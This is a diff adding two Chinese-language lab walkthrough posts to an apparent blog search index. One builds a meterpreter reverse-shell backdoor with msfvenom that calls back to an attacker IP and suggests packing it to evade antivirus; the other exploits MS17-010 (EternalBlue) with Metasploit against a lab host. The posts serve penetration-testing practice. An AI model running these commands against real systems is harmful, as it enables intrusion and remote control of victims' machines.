@@ -429,6 +429,56 @@
     
     
     <entry>
+      <title>msf</title>
+      <link href="/posts/1f8d6f39.html"/>
+      <url>/posts/1f8d6f39.html</url>
+      
+        <content type="html"><![CDATA[<p>Msf后门植入木马监听<br>拿到权限之后<br>放到后台运行：background<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image.png"/></div></div><br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-1.png"/></div></div><br>以下命令生成远程可控后门。<br>Payload 是攻击机IP 192.168.137.140<br>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.137.140 lport=9999 -f exe -o kkhelp.exe<br>此时看到桌面生成 木马文件，那么改如何上钩呢，这里我就自己主动当诱饵<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-3-edited.png"/></div></div><br>使用模块<br>使用模块 use exploit/multi/handler  进行监听<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-4.png"/></div></div><br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-5.png"/></div></div><br>这里我输错了了好几次，一定细心。<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-6.png"/></div></div><br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-7.png"/></div></div><br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-8.png"/></div></div><br>成功<br>免杀<br>以上生成的计算机直接给我杀掉了，以过火绒为例，不会百分百成功偶；可以加壳：压缩壳，加密壳<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-9.png"/></div></div><br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.hlsiyy.love/wp-content/uploads/2022/11/image-10.png"/></div></div></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 复现-网安 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MS17-010</title>
+      <link href="/posts/c05f8476.html"/>
+      <url>/posts/c05f8476.html</url>
+      
+        <content type="html"><![CDATA[<p>Msf永恒之蓝复现<br>靶机IP：192.168.137.141  攻击机你猜🚀<br>扫描存活主机以及端口：  Nmap -Pn 192.168.137.130-140<br>打开漏洞利用框架metasploit framework<br>search ms17-010 发现一个模块<br>使用模块 use 0<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.staticaly.com/gh/ZXGbilibili/picture@main/some/ms17-1.webp"/></div></div><br>Use 0  使用漏洞 命名编号为0  #show options 查看配置项<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.staticaly.com/gh/ZXGbilibili/picture@main/some/ms17-2.webp"/></div></div><br>RHOSTS 显示yes  远程登陆的主机就是<br>payload：set RHOSTS 192.168.137.141<br>运行：run<br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.staticaly.com/gh/ZXGbilibili/picture@main/some/ms17-3.webp"/></div></div><br><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.staticaly.com/gh/ZXGbilibili/picture@main/some/ms17-4.webp"/></div></div><br>获得权限攻击成功</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 复现-网安 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>搭建整理</title>
       <link href="/posts/b428edf1.html"/>
       <url>/posts/b428edf1.html</url>
